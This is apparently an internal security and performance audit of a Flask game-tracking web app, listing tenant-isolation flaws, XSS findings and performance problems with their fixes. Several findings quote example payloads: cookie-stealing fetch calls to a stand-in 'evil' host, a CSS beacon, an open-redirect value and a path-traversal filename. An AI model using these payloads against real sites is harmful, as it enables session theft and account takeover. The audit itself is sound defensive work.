# Security & Performance Audit — 2026-09-11

**Scope:** Working tree on branch `feat/api-contract-restore` (includes ~600 uncommitted lines in `app.py`). Diff base from last audit: `b06e339` (2026-07-05). Files audited: `app.py` (11,754 lines), `deck_import.py`, `templates/` (35 files), `static/` (js, css, sw.js), `Dockerfile`, `docker-compose.yaml`.

**Method:** Three parallel reviews (backend security, frontend security, performance). Every load-bearing finding was verified against the actual source before inclusion; line numbers refer to the audited working tree.

**Context:** Multi-tenant SaaS foundation (pods/playgroups, invites, pricing) landed after the July audit, roughly doubling `app.py`. Attacker-controlled strings per the app's trust model: player names, deck names, usernames, custom commander art URLs, game notes.

---

## SECURITY

### HIGH

#### S1. Cross-tenant game creation via `/api/start_game` — app.py:8300
The web route `/start_game` validates participants against the caller's pod (`allowed_player_ids`, app.py:8121–8146). The API twin performs **no** pod scoping — only deck-not-retired and deck-belongs-to-player-unless-`borrow`.

*Attack:* Any authenticated user POSTs with other pods' player/deck IDs. The join `token` is returned; public `GET /api/join/<token>` (app.py:11634) and `GET /api/game/<token>/state` (app.py:8878) disclose participants' real names, deck names, commander art, mechanics. Finishing via web `/end_game` (app.py:8585) trusts `session["game_participants"]` without revalidation and records a Game row + MMR mutations referencing the victim pod's players/decks.

*Fix:* Mirror the web route's `allowed_player_ids` checks in `api_start_game`; re-validate participants against the caller's pod in `/end_game` before committing.

#### S2. Pod isolation break in `add_pod_member` — app.py:6088 (web), app.py:10891 (API)
Both routes gate on `can_manage_pod(me, pod_id)` for the *target pod* but fetch the victim via `db.session.get(Player, player_id)` with **no check that the player is within the caller's scope**. The UI dropdown is scoped (app.py:5751) but the route accepts any integer.

*Attack:* Any user creates their own pod (auto-podmaster, app.py:5774–5806), then POSTs `player_id=1..N`, enumerating every player in the database into their pod. Since `can_access_player` / `can_access_deck` / `scoped_player_query` are membership-based (app.py:3810–3836), the attacker gains read access to every victim's decks including full decklists (`/deck/<id>`, app.py:7219) and can include them in games. This defeats the entire pod-isolation model by ID guessing.

*Fix:* Require the added player to already be a member of one of the caller's pods (validate against `scoped_player_query(me)`), in both the web and API routes.

#### S3. Stored XSS, auto-firing, in MMR preview — templates/play_game.html:684–693
`updateMmrPreview()` builds `rows.innerHTML` interpolating `${s.name}` where `name = "${playerName} — ${deckData.name}"` from the `<option>` text and `decks_by_player | tojson` (play_game.html:160). No escaping on this path. Runs on page load and every select `change` (:699, :705).

*Attack:* A pod member creates a player or deck named `<img src=x onerror=fetch('//evil/'+document.cookie)>` (no charset validation on `add_player` app.py:7105 / `add_deck` app.py:7536). Payload executes in every podmate's browser once the entry is selected.

*Fix:* Escape before interpolation (quote-inclusive `escapeHtml` as in players.html/life_counter.html) or build rows with `textContent`/`createElement`.

#### S4. JS injection via names inside `onclick="confirm(...)"` — admin_users.html:140,155; players.html:81; decks.html:226; deck_detail.html:81,93,105,116
Jinja autoescape encodes `'` as `&#39;`, but browsers decode attribute entities **before** parsing the JS handler, so a username like `x');MALICIOUS();//` breaks out of the JS string literal. HTML escaping does not protect a JS-in-attribute context.

*Attack:* Non-admin user sets their username (self-service via `apply_user_identity` app.py:3839 — strip, length, uniqueness, no charset restriction) to a payload; when the admin clicks Deactivate/Delete on `/admin/users`, the payload runs in the **admin's session** (CSRF token stealable from meta tag). Same class with player/deck names against regular podmates via the delete/retire/plan confirm dialogs.

*Fix:* Never interpolate names into inline JS. Use `data-username="{{ u.username }}"` + an attached `confirm()` listener, or `|tojson` for the string literal.

#### S5. Attribute injection via custom art URL — static/js/app.js:537,569,610; app.py:2357
`esc()` serializes via `textContent → innerHTML`, which escapes `& < >` but **not `"` or `'`**. Output lands in `style="background-image:url('…')"` inside double-quoted attributes. `Deck.commander_art_url` prefers user-set `custom_commander_art_url`; `is_valid_custom_art_url` (app.py:2357) only checks the `http(s)://` prefix and length ≤500 — quotes allowed.

*Attack:* Deck art URL = `https://x/a.jpg" onmouseover="fetch('//evil/'+document.cookie)" tabindex="1"` (no `<>` needed). Any podmate opening the entity drawer (index/players/decks pages) and hovering the deck row executes the payload.

*Fix:* Quote-escaping escaper (`replace(/[&<>"']/g,…)`) or DOM construction with `el.style.backgroundImage` via CSSOM (the pattern already used correctly in player_panel.html:198). Also reject `'`, `\`, newlines in `is_valid_custom_art_url`.

### MEDIUM

- **M1. `api_login` sessions bypass `session_version` revocation** — app.py:9800–9806 sets session fields directly without `session_version`, unlike `_establish_session` (app.py:9844). `apply_password_reset` (app.py:3790) and admin identity edits bump `session_version` to revoke sessions — but a session minted by `/api/login` that has made no subsequent request has no `session_version`; the "self-heal" branch (app.py:4393) then stamps it with the *current* version and it stays valid. A stolen Android cookie held unused survives a password reset. *Fix:* use `_establish_session` in `api_login`; reject authenticated sessions missing `session_version`.
- **M2. Deactivation doesn't revoke sessions; `before_request` ignores `is_active`** — app.py:5284, 10541 set `is_active=False` without bumping `session_version`; `before_request` (app.py:4388) checks only `deleted_at`. `api_login` (app.py:9784) also lacks the `deleted_at` guard the web login has (app.py:4513). Deactivated users keep working sessions indefinitely. *Fix:* bump `session_version` on deactivate; check `is_active` and `deleted_at` in `before_request`.
- **M3. Cross-tenant roster leaks** — `/` (app.py:5486: `Player.query.all()`, 5542: `Deck.query.all()`) and `/api/stats` (app.py:10050, 10096–10127) pod-scope the *games* but iterate *global* player/deck rosters: every tenant's names, commanders, owners (zero-filled stats included) are returned to every authenticated user. *Fix:* use `scoped_player_query` / `scoped_deck_query` for all roster loops and dropdowns (also `/games` dropdowns at app.py:6423–6424).
- **M4. `/api/homepage` public and unscoped** — app.py:7819; anonymous callers get every player's name/wins/winrate across all pods plus last-game winner/commander/art. The CORS header only constrains browsers. *Fix:* gate behind auth or explicit per-pod opt-in.
- **M5. Open redirect bypass** — app.py:4534 rejects `//` and `://` but `next=/\evil.com` passes; browsers normalize `\` to `/` → victim lands on `//evil.com` after login. *Fix:* `next.startswith("/") and not next.startswith("//") and "\\" not in next`.
- **M6. `borrow=true` skips deck ownership entirely** — app.py:9632, 8326 (web route constrains decks to pod players at app.py:8143): fabricated games can attach any deck in the DB, and `_apply_mmr_for_game` then mutates the foreign deck's MMR. *Fix:* require the borrowed deck's owner to be in the caller's active pod.
- **M7. CDN scripts without SRI on authenticated screen** — life_counter.html:2454 (bootstrap@5.3.3), :2456 (qrcodejs@1.0.0): jsdelivr compromise injects JS into the game screen; everywhere else assets are self-hosted. *Fix:* self-host both, or add `integrity` + `crossorigin="anonymous"`.
- **M8. CSS injection via art URL on life counter** — life_counter.html:54 `--bg-image:url('{{ p.commander_art }}')` (and :1233, play_game.html:310): a `'` in the URL terminates the CSS string → overlay/phishing CSS, IP-beacon `background:url(//attacker/log)` rendered to everyone at the table. No JS execution via CSS in modern browsers. *Fix:* same validator tightening as S5.

### LOW

- **L1.** Public unthrottled art/media endpoints; custom-art filenames use 8 hex chars (32 bits entropy, app.py:2427); `/media` mints presigned S3 URLs for any nameable `custom-art/...` key (app.py:4772).
- **L2.** Anonymous unthrottled `landing_visit` DB insert per cookie-less hit on `/` (app.py:5470) — unbounded `funnel_event` growth; `POST /pods` unrate-limited.
- **L3.** Login flows don't `session.clear()` before writing identity (app.py:4502, 9800, 5940) → login-CSRF possible (auth POSTs are CSRF-exempt by design, app.py:4315); `GET /logout` has no CSRF protection (app.py:4544).
- **L4.** `public_recap` always renders the pod name even when name-visibility flags hide players/decks (templates/public_recap.html:3–4).
- **L5.** Compose lacks `APP_ENV=production` and `TRUST_PROXY=1` (docker-compose.yaml:10–14): `SESSION_COOKIE_SECURE` defaults off; behind NPM the limiter key is the proxy IP for everyone → the 10/min `/api/login` bucket is global (one attacker can lock out all logins). docs/production-operations.md says to set these; the compose file doesn't.
- **L6 (suspicion, code path confirmed).** `download_art_crop` interpolates the raw gallery card `id` into the art filename without `_safe_filename` (app.py:2909, source at 2851): a malicious cc-auto gallery entry named `../../commander.db` could clobber the DB with fetched bytes. Cheap defense-in-depth fix.

### Verified safe (no action)

Tokens (pod invites, game shares, email verification, password reset) all `secrets.token_urlsafe(32)`, stored SHA-256-hashed only (app.py:3600). Passwords werkzeug-hashed with weak-list. Global `before_request` CSRF check (app.py:4310–4325, `hmac.compare_digest`) covers all new browser POST routes; API relies coherently on SameSite=Lax. `/api/login` rate limit retained. Zero `|safe` in any template; `|tojson` everywhere in `<script>`. No SQLi (all `text()` bound-parameter), no SSRF (importer domain-allowlisted, gallery host fixed), no `eval`/`exec`/`subprocess`/`pickle`. Search API properly scoped (app.py:11694). Game-state POST authz host-or-claimed-seat (app.py:8906); lost-update race fix (BEGIN IMMEDIATE RMW) intact. Share links hashed + revocable + visibility flags honored. Admin identity edits bump `session_version` only for the edited user. `.env` not committed; no hardcoded secrets. Deck delete/retire/plan ownership and admin gating from the July P0 wave show **no regressions**.

---

## PERFORMANCE

### P1 (HIGH) — Per-card sequential HTTP in `compute_deck_tags` — app.py:2670, 2515
One synchronous Scryfall call (timeout 10s) + gallery fallback (5s) **per card**; a Commander decklist is 60–100 unique cards → 60–100 sequential round-trips inside one gunicorn worker: 15–50s per import/retag, worst case exceeds the 60s gunicorn timeout and kills the worker mid-request. No inter-request delay trips Scryfall etiquette → 429s, and non-200 silently marks cards "unresolved", degrading tags. Called from every deck create/update with import (app.py:3519), `retag_deck` (7786), and API deck POST (11419).

*Fix:* Scryfall batch endpoint `POST /cards/collection` (75 identifiers/call → 100 cards in 2 requests); persist per-card oracle data (reuse the disk-backed JSON index pattern from the art cache); optionally background the job with "tags pending".

### P2 (HIGH) — Per-item COUNT N+1s on list pages
`/` is already aggregated (app.py:5485–5505) but the pattern persists elsewhere:

| Route | Location | Cost today |
|---|---|---|
| `/decks` | app.py:7162–7179 | ~260 queries for 87 decks — incl. the identical `used` query run twice (7168 and 7177) |
| `/api/decks` GET | 11466 → `_serialize_deck_summary` 9339 | ~175+ |
| `/api/stats` | 10052–10126 | ~190/call (Android hits this) |
| `/players` | 6690–6728 | ~45 |
| `/player/<id>` | 6767–6804 | grows linearly with history (unpaginated participations) |
| `/deck/<id>` | 7244–7282 | ~3–4 queries per game the deck played |

*Fix:* Copy the GROUP BY aggregate pattern from `/`; `selectinload(GameParticipant.player/deck)`; delete the duplicate query at 7177.

### P3 (MEDIUM/HIGH) — 4 sync workers serve all static/art bytes
No nginx static mapping/whitenoise; `/static/*` (bootstrap 156K+80K, ~940KB fonts) and `/art/*` go through the same 4 single-threaded workers as page routes and the 2s life-counter polls. First uncached `/decks` (87 art tiles) or life counter (GIF backgrounds) is where game-night lag comes from.

*Fix:* Serve `/static` + `/art` from nginx/NPM (far-future cache for content-addressed art filenames), or gunicorn `gthread` with 4 threads.

### P4 (MEDIUM) — Multi-worker correctness (with perf side effects)
1. **Flask-Limiter `storage_uri="memory://"`** (app.py:239) with 4 workers per container: effective limits ×4, headers lie. Use a shared backend or 1 worker.
2. **Card-art index races** (app.py:2240–2351): process-local dicts mirrored to `name_index.json`/`failure_index.json` by rewriting the whole file via a **fixed `.tmp` sibling path** — 8 processes across two containers sharing `/data/card_art/` interleave on the same tmp file: lost entries → duplicate upstream fetches; pathological interleaving corrupts the JSON (silently reset). *Fix:* unique tmp name (`tempfile.mkstemp` in dir) or move the index into SQLite.
3. **Shared `/data/backups`**: both containers write `commander-<stamp>.db` (app.py:1339); same-second snapshots collide, and the 120s dedupe (app.py:1332) can treat the other container's backup as its own → test DB can go unbacked-up. Prefix with channel/DB name. (Note: stable/test use *different* DB files — commander.db vs commander-test.db, app.py:137–139 — but share the art cache, indexes, and backups dir.)
4. **Startup**: every worker takes a WAL-safe snapshot at import unless <120s old; migrations flock-serialized — fine now, consider a one-shot entrypoint as the DB grows.

### P5 (MEDIUM) — Growth-limiting patterns
- Full-scan unpaginated analytics: `/saltmine` + `/api/saltmine` load every scoped game+participant and parse `flags_json` per participant — and `/api/saltmine` queries the same participant set **twice** (app.py:10157 and 10341).
- `GET /api/game/<token>/state` returns full `state_json` every 2s poll even when unchanged; client already version-gates. Add `?since=<version>` → 204, or ETag. (Mitigations in place: history capped at 120 samples/player, counters clamped, payload ~10–50KB.)
- `get_current_user()` + `get_active_pod()` re-run 2–6× per request (before_request, `inject_pod_context`, `game_query_for_scope`) incl. every poll — memoize on `flask.g`.
- `FunnelEvent` never pruned; `/api/decks` GET unpaginated; `/games` dropdowns load all players+decks per view; session cookie carries `game_participants` incl. art URLs (approaches 4KB with 6 players).
- Blocking external I/O budget: `/api/card-art` worst case ≈40s lookup + 80s download (exceeds 60s worker timeout — Dockerfile comment acknowledges); Moxfield import tries 3 hosts × 15s. All have explicit timeouts/backoff/failure-cache (good), but they pin sync workers.

### P6 (LOW) — Image/repo bloat shipped by `COPY . .`
Unreferenced in code: `mumei.jpg` (544KB), `saltmine-logo.png` (2.2MB), `app.py.bak` (230KB), `static/bootstrap.zip`, `static/mtg-svg.zip`, unminified bootstrap + 4 `.map` files (~1.6MB), unused fonts (~9MB TTF; referenced fonts ~940KB → WOFF2 saves ~30%). Add to `.dockerignore`.

### Verified fine
SQLite WAL + `synchronous=NORMAL` + `busy_timeout=15000` on every connection (app.py:187–206); dedicated AUTOCOMMIT + BEGIN IMMEDIATE game-state RMW with 503-on-contention; indexes cover hot lookups (pod/date composites, participant composites, token uniques); `/games` and `/api/games` paginated with batched participant fetch; client polling well-behaved (2s tick, in-flight guard, capped backoff, version-gated apply, single master tick); service worker strategy split correct (network-first pages, SWR css/js, cache-first assets — no authenticated-page caching); regexes precompiled; `_get_with_backoff` honors 429/Retry-After; disk-backed failure cache prevents dead-lookup hammering.

---

## Recommended remediation order

1. **S1 + S2** — tenant isolation (cross-pod IDOR family)
2. **S3 + S4 + S5 (+M7, M8)** — XSS/injection family; shared fix: one escaping convention + `data-*` attributes + tightened art-URL validator
3. **P1** — batch card lookups (removes worst user-visible latency)
4. **M1 + M2** — session revocation gaps
5. **M3 + M4** — roster scoping + `/api/homepage`
6. **P2 + P3** — query aggregates + static offload
7. Everything else (M5, M6, P4, P5, P6) as a P2 wave

**Caveat:** the working tree contains ~600 uncommitted lines (`feat/api-contract-restore`); commit or stash before cutting remediation branches.
